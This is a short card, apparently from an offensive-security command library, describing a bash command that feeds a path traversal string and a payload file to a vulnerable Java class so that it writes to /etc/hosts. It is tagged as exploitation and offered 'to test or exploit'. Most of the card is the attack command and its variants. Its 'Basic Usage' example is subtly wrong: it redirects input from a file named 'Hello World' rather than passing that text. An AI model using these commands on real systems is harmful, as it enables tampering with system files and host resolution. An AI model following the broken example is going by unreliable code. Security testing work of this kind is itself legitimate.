---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
name: java-invoke-with-payload
type: command
executor: bash
data: java -cp . VulnerableClass "../../../../etc/hosts" < payload.txt
output: null
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:26:12.509Z'
platforms:
  - Linux
  - Java
tags:
  - exploitation
  - path-traversal
verified: false
validated: true
submitted: true
---

# java-invoke-with-payload

## Command

```bash
java -cp . VulnerableClass "../../../../etc/hosts" < payload.txt
```

## Description

This command invokes a vulnerable Java class with a path traversal payload as the first argument (arg[0]), redirecting content from a file to simulate writing to an arbitrary location via FileOutputStream. Use it to test or exploit path traversal in Java applications on Linux.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-cp .` | Classpath specifying the current directory for the Java class | Yes |
| `VulnerableClass` | Name of the vulnerable Java class to execute | Yes |
| `"../../../../etc/hosts"` | Traversal payload as arg[0] for the file path | Yes |
| `< payload.txt` | Redirects input from a file containing content to write | Yes |

## Examples

### Basic Usage

```bash
java -cp . VulnerableClass "../test.txt" < "Hello World"
```

### Advanced Usage

```bash
java -jar vulnerable.jar "../../../../etc/hosts" --append < payload.txt
```
(Assumes JAR with additional flags for write mode)

## Expected Output

The Java application runs without throwing FileNotFoundException or security errors, completing silently or with a success message. No output if the write succeeds; check the target file for changes.

## Related

- [[Related Procedure|procedures/Exploit-Path-Traversal-for-Arbitrary-File-Write-in-Java-App]]
